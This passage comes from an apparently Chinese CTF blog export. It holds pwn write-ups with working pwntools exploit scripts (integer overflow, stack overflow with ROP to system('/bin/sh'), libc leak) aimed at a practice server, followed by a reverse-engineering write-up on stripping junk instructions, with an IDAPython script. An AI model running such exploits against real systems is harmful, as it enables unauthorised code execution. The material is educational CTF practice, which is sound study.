class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"int-overflow\"><a href=\"#int-overflow\" class=\"headerlink\" title=\"int_overflow\"></a>int_overflow</h2><p>该题开启了NX，没有开启PIE和canary。</p>\n<p>通过整数溢出漏洞溢出v3，过掉输入长度的校验（在3到8之间），顺便修改返回地址。</p>\n<p>exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">p = process(<span class=\"string\">\"./int_overflow\"</span>)</span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.198.29.45\"</span>, <span class=\"number\">31580</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">magic = <span class=\"number\">0x0804868B</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"Your choice:\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"Please input your username:\\n\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"liwc\"</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"passwd:\\n\"</span>)</span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(p)</span></span><br><span class=\"line\">p.send(<span class=\"number\">0x18</span> * <span class=\"string\">\"a\"</span> + p32(magic) + (<span class=\"number\">262</span> - <span class=\"number\">0x18</span> - <span class=\"number\">4</span>) * <span class=\"string\">\"b\"</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"cgpwn2\"><a href=\"#cgpwn2\" class=\"headerlink\" title=\"cgpwn2\"></a>cgpwn2</h2><p>该题是一个常规的栈溢出，构造很短的rop链即可。这里我使用了一条call system指令配合输入到bss段的/bin/sh字符串实现。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:0804855A                 call    _system</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">p = process(<span class=\"string\">\"./cgpwn2\"</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./cgpwn2\"</span>)</span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.198.29.45\"</span>, <span class=\"number\">31688</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"name\\n\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"/bin/sh\\x00\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"here:\\n\"</span>)</span><br><span class=\"line\">payload = (<span class=\"number\">0x26</span> + <span class=\"number\">4</span>) * <span class=\"string\">\"a\"</span></span><br><span class=\"line\">payload += p32(<span class=\"number\">0x804855a</span>)</span><br><span class=\"line\">payload += p32(<span class=\"number\">0x0804A080</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"level3\"><a href=\"#level3\" class=\"headerlink\" title=\"level3\"></a>level3</h2><p>该题理论上是新手入坑中最难的一题，因为题目没有提供libc文件，并且system不是程序的导入函数，所以必须手动leak libc。注意由于一次溢出劫持控制流并不能完成利用，所以需要在leak libc之后返回到vulnerable function，再次溢出执行system(“/bin/sh”)。这里使用了LibcSearcher（<a href=\"https://github.com/lieanu/LibcSearcher\" target=\"_blank\" rel=\"noopener\">repo地址</a>）。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./level3\"</span>)</span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.198.29.45\"</span> ,<span class=\"number\">31718</span>)</span><br><span class=\"line\"><span class=\"comment\"># p = process(\"./level3\")</span></span><br><span class=\"line\"></span><br><span class=\"line\">offset = <span class=\"number\">0x88</span> + <span class=\"number\">4</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"Input:\\n\"</span>)</span><br><span class=\"line\">rop = offset * <span class=\"string\">\"a\"</span></span><br><span class=\"line\">rop += p32(elf.plt[<span class=\"string\">'write'</span>])</span><br><span class=\"line\">rop += p32(<span class=\"number\">0x804844b</span>)</span><br><span class=\"line\">rop += p32(<span class=\"number\">1</span>) + p32(elf.got[<span class=\"string\">'__libc_start_main'</span>]) + p32(<span class=\"number\">4</span>)</span><br><span class=\"line\">p.sendline(rop)</span><br><span class=\"line\">addr = u32(p.recvuntil(<span class=\"string\">\"\\xf7\"</span>)[<span class=\"number\">-4</span>:])</span><br><span class=\"line\"><span class=\"keyword\">print</span> hex(addr)</span><br><span class=\"line\"></span><br><span class=\"line\">obj = LibcSearcher(<span class=\"string\">'__libc_start_main'</span>, addr)</span><br><span class=\"line\">libc_base = addr - obj.dump(<span class=\"string\">\"__libc_start_main\"</span>)</span><br><span class=\"line\">system = libc_base + obj.dump(<span class=\"string\">\"system\"</span>)</span><br><span class=\"line\">binsh = libc_base + obj.dump(<span class=\"string\">\"str_bin_sh\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"Input:\\n\"</span>)</span><br><span class=\"line\">rop = offset * <span class=\"string\">\"a\"</span></span><br><span class=\"line\">rop += p32(system)</span><br><span class=\"line\">rop += p32(<span class=\"number\">0x804844b</span>)</span><br><span class=\"line\">rop += p32(binsh)</span><br><span class=\"line\">p.sendline(rop)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n","text":"新手练习when_did_you_borngets(&amp;v4)处存在栈溢出，覆盖掉v5，为1926(0x786)即可。v4 = rsp+0x0; v5 = rsp + 0x8; 所以偏移为0x81<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":5,"path":"api/tags/pwn.json"}]},{"title":"花指令去除wp","slug":"花指令去除wp","date":"2018-12-05T13:50:11.000Z","updated":"2018-12-06T06:48:32.000Z","comments":true,"path":"api/articles/花指令去除wp.json","excerpt":"","keywords":null,"cover":null,"content":"<p>​    这学期《恶意代码分析》这门课的作业留了一道RE题，其中包含大量批量插入的花指令。在这里简单记录一下分析过程。</p>\n<h2 id=\"0x00-基本分析\"><a href=\"#0x00-基本分析\" class=\"headerlink\" title=\"0x00  基本分析\"></a>0x00  基本分析</h2><p>首先动态执行程序看一下</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">D:\\UCAS\\malware_analyse&gt;Anti.exe</span><br><span class=\"line\">The encypted flag in hex is:</span><br><span class=\"line\">3A3B3138233B3C3437300B3730073228393523062E2B242A</span><br><span class=\"line\">Please input cipher character:3</span><br><span class=\"line\">Hex result for encrypt string 'thisisasimplesamplestring' is:</span><br><span class=\"line\">7A6D6B7E63756C706D61766661796B62756067787271656B6B</span><br></pre></td></tr></table></figure>\n<p>输入点只有一个，要求输入一个加密字符，然后就会输出对<code>thisisasimplesamplestring</code>字符串的加密结果。那么显然，只要我们能够分析并逆向出加密算法，就能把加密后的flag解密得到原flag，当然这个加密算法应该是可逆的，否则就有点难办了。</p>\n<p>首先用IDA加载Anti.exe，并加载题目所给的pdb文件——应该说出题人还是很好的（谢谢师兄~_~）。之后粗略浏览反汇编代码，主要有两点发现：</p>\n<ul>\n<li>该程序应该由C++语言编写，因为有虚表和类层次关系</li>\n<li>代码中添加了大量花指令</li>\n</ul>\n<h2 id=\"0x01-花指令分析\"><a href=\"#0x01-花指令分析\" class=\"headerlink\" title=\"0x01  花指令分析\"></a>0x01  花指令分析</h2><p>下面对代码中涉及到的花指令作基本分析</p>\n<p>1.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00401A1B loc_401A1B:                             ; CODE XREF: .text:loc_401A1B↑j</span><br><span class=\"line\">.text:00401A1B                 jmp     short near ptr loc_401A1B+1</span><br><span class=\"line\">.text:00401A1D ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:00401A1D                 ror     byte ptr [eax-73h], 45h</span><br></pre></td></tr></table></figure>\n<p>这是因为两条顺序执行的指令使用了一个公共byte，而IDA在反汇编完一条指令后，会从这条指令的下一个地址处开始反汇编，所以无法表示这种情况。具体来说，0x401a1b处是<code>0xeb</code>,0x401a1c处是<code>0xff</code>，IDA首先把0xeb翻译成jmp指令，然后往下找操作数，是短跳转+1；之后，就会顺序反汇编0x401a1d处的内容。但是程序在执行时实际上跳转到0x1a1c处执行，这就导致一个矛盾。</p>\n<p>手工去掉花指令还原即可，暂时不用管那个垃圾字节，在脚本批量去除阶段可以Patch为NOP指令。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00401A14 ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:00401A1B                 db 0EBh</span><br><span class=\"line\">.text:00401A1C ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:00401A1C                 inc     eax</span><br><span class=\"line\">.text:00401A1E                 dec     eax</span><br><span class=\"line\">.text:00401A1F                 lea     eax, [ebp-34h]</span><br></pre></td></tr></table></figure>\n<p>2.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:004019E5                 push    offset __ehhandler$?enc2@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V12@D@Z</span><br><span class=\"line\">.text:004019EA                 mov     eax, large fs:0</span><br><span class=\"line\">.text:004019F0                 push    eax</span><br><span class=\"line\">.text:004019F1                 mov     large fs:0, esp</span><br><span class=\"line\">......</span><br><span class=\"line\">.text:00401A4E                 xor     eax, eax</span><br><span class=\"line\">.text:00401A50                 idiv    eax</span><br><span class=\"line\">.text:00401A52                 retn</span><br><span class=\"line\">.text:00401A53                 db 8Bh</span><br><span class=\"line\">.text:00401A54                 dd 64082464h, 0A1h, 8B008B00h, 0A36400h, 83000000h, 5D5808C4h</span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure>\n<p>这算是第二种花指令。0x4019e5处的四条指令首先将fs[0]压入堆栈，从而使得执行完成后，fs[0]指向栈顶。之后，构造一个err结构。在0x401a4e处，故意触发一个除零异常，然后就会进入异常处理流程。</p>\n<p>同时，由于除零后是一条retn指令，IDA在反汇编时不会将retn的下一个地址识别为指令，直到找到一个函数头<code>push    ebp; mov    ebp, esp</code> ，这又使得反汇编出错。</p>\n<p>详细的异常处理流程我们在静态分析阶段不好分析，如读者感兴趣可以详细查阅资料。但我们通过OD调试可以大体了解程序的控制流。</p>\n<p>在0x401a50处下断，并在调试选项中去掉所有忽略异常的勾选，点击确定后F9断到断点处，然后F8单步调试，到达如下位置</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">7C92E460    8B1C24          mov ebx,dword ptr ss:[esp]</span><br><span class=\"line\">7C92E463    51              push ecx</span><br><span class=\"line\">7C92E464    53              push ebx</span><br><span class=\"line\">7C92E465    E8 E6C40100     call ntdll.7C94A950</span><br></pre></td></tr></table></figure>\n<p>F7步入函数调用，然后继续单步跟，看到一个可疑位置，会将0x401a53的地址作为参数压栈，然后调用一个函数，步入函数。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">7C923261    FF7424 20       push dword ptr ss:[esp+0x20]             ; Anti.00401A53</span><br><span class=\"line\">7C923265    FF7424 20       push dword ptr ss:[esp+0x20]             ; Anti.00401A53</span><br><span class=\"line\">7C923269    FF7424 20       push dword ptr ss:[esp+0x20]             ; Anti.00401A53</span><br><span class=\"line\">7C92326D    FF7424 20       push dword ptr ss:[esp+0x20]             ; Anti.00401A53</span><br><span class=\"line\">7C923271    FF7424 20       push dword ptr ss:[esp+0x20]             ; Anti.00401A53</span><br><span class=\"line\">7C923275    E8 08000000     call ntdll.7C923282</span><br></pre></td></tr></table></figure>\n<p>果然，此处最终<code>call ecx</code>，使得eip跳转到0x401a53处执行。所以我们应该在0x401a53处按C识别为代码，修复反汇编。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">7C923289    64:FF35 0000000&gt;push dword ptr fs:[0]</span><br><span class=\"line\">7C923290    64:8925 0000000&gt;mov dword ptr fs:[0],esp</span><br><span class=\"line\">7C923297    FF75 14         push dword ptr ss:[ebp+0x14]</span><br><span class=\"line\">7C92329A    FF75 10         push dword ptr ss:[ebp+0x10]</span><br><span class=\"line\">7C92329D    FF75 0C         push dword ptr ss:[ebp+0xC]</span><br><span class=\"line\">7C9232A0    FF75 08         push dword ptr ss:[ebp+0x8]</span><br><span class=\"line\">7C9232A3    8B4D 18         mov ecx,dword ptr ss:[ebp+0x18]          ; Anti.00401A53</span><br><span class=\"line\">7C9232A6    FFD1            call ecx                                 ; Anti.00401A53</span><br></pre></td></tr></table></figure>\n<p>3.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00401A8A                 jz      near ptr loc_401A96+4</span><br><span class=\"line\">.text:00401A90                 jnz     near ptr loc_401A96+4</span><br><span class=\"line\">.text:00401A96</span><br><span class=\"line\">.text:00401A96 loc_401A96:                             ; CODE XREF: .text:00401A8A↑j</span><br><span class=\"line\">.text:00401A96                                         ; .text:00401A90↑j</span><br><span class=\"line\">.text:00401A96                 call    near ptr 0F733CACh</span><br></pre></td></tr></table></figure>\n<p>比起上面两种花指令，这一种都算小菜啦。构造连续两个互补的条件跳转到同一位置。因为条件跳转为基本块出口，诱导IDA反汇编基本块邻接地址为新的基本块入口。实际上只是几个字节的垃圾数据。简单修复即可。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00401A8A                 jz      loc_401A9A</span><br><span class=\"line\">.text:00401A90                 jnz     loc_401A9A</span><br><span class=\"line\">.text:00401A90 ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:00401A96                 db 0E8h</span><br><span class=\"line\">.text:00401A97                 db  11h</span><br><span class=\"line\">.text:00401A98                 db  22h ; &quot;</span><br><span class=\"line\">.text:00401A99                 db  33h ; 3</span><br><span class=\"line\">.text:00401A9A ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:00401A9A</span><br><span class=\"line\">.text:00401A9A loc_401A9A:                             ; CODE XREF: .text:00401A8A↑j</span><br><span class=\"line\">.text:00401A9A                                         ; .text:00401A90↑j</span><br></pre></td></tr></table></figure>\n<p>4.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00401ACA                 xor     eax, eax</span><br><span class=\"line\">.text:00401ACC                 jz      near ptr loc_401AD2+1</span><br><span class=\"line\">.text:00401AD2</span><br><span class=\"line\">.text:00401AD2 loc_401AD2:                             ; CODE XREF: .text:00401ACC↑j</span><br><span class=\"line\">.text:00401AD2                 call    near ptr 0D085A62Fh</span><br></pre></td></tr></table></figure>\n<p>这种是构造一个恒真的条件跳转，再加上一个垃圾字节，很好理解。简单修复即可。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00401ACA                 xor     eax, eax</span><br><span class=\"line\">.text:00401ACC                 jz      loc_401AD3</span><br><span class=\"line\">.text:00401ACC ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:00401AD2                 db 0E8h</span><br><span class=\"line\">.text:00401AD3 ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:00401AD3</span><br><span class=\"line\">.text:00401AD3 loc_401AD3:                             ; CODE XREF: .text:00401ACC↑j</span><br><span class=\"line\">.text:00401AD3                 pop     eax</span><br><span class=\"line\">.text:00401AD4                 mov     eax, [ebp-30h]</span><br></pre></td></tr></table></figure>\n<p>分析到这里，第一个函数enc1的花指令我们已经完全去除了，在IDA中按F5可以进行反编译。不过在手动分析下一个函数后，按F5无法进行反编译。这是因为IDA没有将其识别为函数，我们在已修复的函数入口点处按P MakeProc即可。</p>\n<h2 id=\"0x02-脚本批量去除花指令\"><a href=\"#0x02-脚本批量去除花指令\" class=\"headerlink\" title=\"0x02 脚本批量去除花指令\"></a>0x02 脚本批量去除花指令</h2><p>到这里相信手工去除花指令已经难不倒大家了，但是程序中显然有大量批量插入的花指令，如果一一通过手工去除，不太可行。这时候，我们可以借助IDAPython这个工具编写一个去除花指令的插件。<a href=\"https://www.hex-rays.com/products/ida/support/idapython_docs/\" target=\"_blank\" rel=\"noopener\">官方文档</a>对于IDAPython的API有一定程度的讲解，但是这个东西还是有一定的学习成本的，如果感觉上手困难可以看一下Hex-Rays官方每年举办的IDA插件大赛的获奖作品（<a href=\"https://hex-rays.com/contests/\" target=\"_blank\" rel=\"noopener\">链接在这</a>），学习一下。</p>\n<p>这里先直接给出脚本。其实写的很不好，主要思路就是逐指令或逐字节遍历，然后对这几种花指令予以识别和去除。同时由于比较懒，直接设置remove函数执行5次，暴力解决递归问题。不过多执行几次是没有副作用的。</p>\n<p>另外，执行脚本后，可能还会有极少量代码反汇编出错，在分析到相应函数后手工按C识别为代码即可。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> ida_auto <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> ida_bytes <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> ida_ua <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">change = <span class=\"number\">0</span></span><br><span class=\"line\">startea = <span class=\"number\">0x4019e0</span></span><br><span class=\"line\">endea = <span class=\"number\">0x405230</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">preprocess</span><span class=\"params\">(curea = startea)</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> curea &lt;= endea:</span><br><span class=\"line\">\t\tauto_make_code(curea)</span><br><span class=\"line\">\t\tcurea = next_head(curea, endea)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">remove</span><span class=\"params\">(curea = startea)</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> curea &lt;= endea:</span><br><span class=\"line\">\t\t<span class=\"comment\"># print hex(curea)</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> GetDisasm(curea) == <span class=\"string\">\"retn\"</span>:</span><br><span class=\"line\">\t\t\tMakeCode(curea + <span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> GetDisasm(curea).startswith(<span class=\"string\">\"db\"</span>) <span class=\"keyword\">is</span> <span class=\"literal\">True</span> <span class=\"keyword\">and</span> GetDisasm(curea + <span class=\"number\">1</span>).startswith(<span class=\"string\">\"db\"</span>) <span class=\"keyword\">is</span> <span class=\"literal\">False</span> <span class=\"keyword\">and</span> GetDisasm(curea).endswith(<span class=\"string\">\")\"</span>) <span class=\"keyword\">is</span> <span class=\"literal\">False</span>:</span><br><span class=\"line\">\t\t\tdo_unknown(curea + <span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t\tMakeCode(curea)</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> xref <span class=\"keyword\">in</span> XrefsFrom(curea, <span class=\"number\">1</span>):</span><br><span class=\"line\">\t\t\t<span class=\"comment\"># print hex(xref.frm), hex(xref.to)</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> xref.to - xref.frm == <span class=\"number\">1</span>:</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> get_byte(xref.frm) == <span class=\"number\">0xeb</span>:</span><br><span class=\"line\">\t\t\t\t\t<span class=\"comment\"># print \"yes\"</span></span><br><span class=\"line\">\t\t\t\t\tea = xref.frm</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">20</span>):</span><br><span class=\"line\">\t\t\t\t\t\tdo_unknown(ea)</span><br><span class=\"line\">\t\t\t\t\t\tea += <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t\t\tea = xref.to</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">20</span>):</span><br><span class=\"line\">\t\t\t\t\t\tMakeCode(ea)</span><br><span class=\"line\">\t\t\t\t\t\tea += <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t\t\tpatch_byte(xref.frm, <span class=\"number\">0x90</span>)</span><br><span class=\"line\">\t\t\t\t\tchange = MakeCode(xref.frm)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">elif</span> xref.to == next_head(curea, endea) + <span class=\"number\">1</span>:</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> get_byte(xref.to - <span class=\"number\">1</span>) == <span class=\"number\">0xe8</span>:</span><br><span class=\"line\">\t\t\t\t\t<span class=\"comment\"># print \"yess\"</span></span><br><span class=\"line\">\t\t\t\t\tdo_unknown(xref.to - <span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t\t\t\tea = xref.to</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">20</span>):</span><br><span class=\"line\">\t\t\t\t\t\tMakeCode(ea)</span><br><span class=\"line\">\t\t\t\t\t\tea += <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t\t\tpatch_byte(xref.to - <span class=\"number\">1</span>, <span class=\"number\">0x90</span>)</span><br><span class=\"line\">\t\t\t\t\tMakeCode(xref.to - <span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">elif</span> xref.to == next_head(next_head(curea, endea), endea) + <span class=\"number\">4</span>:</span><br><span class=\"line\">\t\t\t\ttar_ea = next_head(next_head(curea, endea), endea)</span><br><span class=\"line\">\t\t\t\tea = tar_ea</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">20</span>):</span><br><span class=\"line\">\t\t\t\t\tdo_unknown(ea)</span><br><span class=\"line\">\t\t\t\t\tea += <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t\tea = xref.to</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">20</span>):</span><br><span class=\"line\">\t\t\t\t\tMakeCode(ea)</span><br><span class=\"line\">\t\t\t\t\tea += <span 